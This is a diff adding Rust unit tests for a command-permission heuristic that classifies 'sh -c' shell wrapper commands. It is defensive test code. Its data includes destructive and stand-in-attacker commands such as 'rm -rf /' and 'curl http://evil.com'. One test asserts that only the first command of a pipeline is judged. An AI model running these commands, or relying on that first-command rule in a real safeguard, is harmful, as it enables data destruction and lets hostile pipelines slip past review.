@@ -143,4 +143,43 @@ mod tests {
         let eval = policy.check(&cmd(&["test", "good"]));
         assert!(eval.is_allowed());
     }
+
+    #[test]
+    fn test_heuristics_shell_wrapper_safe() {
+        // sh -c "ls" should be allowed (ls is safe)
+        assert_eq!(default_heuristics(&cmd(&["sh", "-c", "ls"])), Decision::Allow);
+        assert_eq!(default_heuristics(&cmd(&["sh", "-c", "ls -la"])), Decision::Allow);
+        assert_eq!(default_heuristics(&cmd(&["bash", "-c", "echo hello"])), Decision::Allow);
+        assert_eq!(default_heuristics(&cmd(&["sh", "-c", "git status"])), Decision::Allow);
+    }
+
+    #[test]
+    fn test_heuristics_shell_wrapper_dangerous() {
+        // sh -c "rm -rf /" should require prompt (rm is dangerous)
+        assert_eq!(default_heuristics(&cmd(&["sh", "-c", "rm -rf /"])), Decision::Prompt);
+        assert_eq!(default_heuristics(&cmd(&["bash", "-c", "sudo apt install"])), Decision::Prompt);
+        assert_eq!(default_heuristics(&cmd(&["sh", "-c", "curl http://evil.com"])), Decision::Prompt);
+    }
+
+    #[test]
+    fn test_heuristics_shell_wrapper_pipeline() {
+        // First command in pipeline is what matters
+        assert_eq!(default_heuristics(&cmd(&["sh", "-c", "ls | grep foo"])), Decision::Allow);
+        assert_eq!(default_heuristics(&cmd(&["sh", "-c", "cat file.txt | wc -l"])), Decision::Allow);
+    }
+
+    #[test]
+    fn test_heuristics_shell_wrapper_quoted() {
+        // Handle quoted arguments
+        assert_eq!(default_heuristics(&cmd(&["sh", "-c", "echo 'hello world'"])), Decision::Allow);
+        assert_eq!(default_heuristics(&cmd(&["sh", "-c", "echo \"hello world\""])), Decision::Allow);
+    }
+
+    #[test]
+    fn test_heuristics_direct_shell_is_safe() {
+        // Direct sh/bash invocation without -c should be safe
+        assert_eq!(default_heuristics(&cmd(&["sh"])), Decision::Allow);
+        assert_eq!(default_heuristics(&cmd(&["bash"])), Decision::Allow);
+        assert_eq!(default_heuristics(&cmd(&["zsh"])), Decision::Allow);
+    }
 }
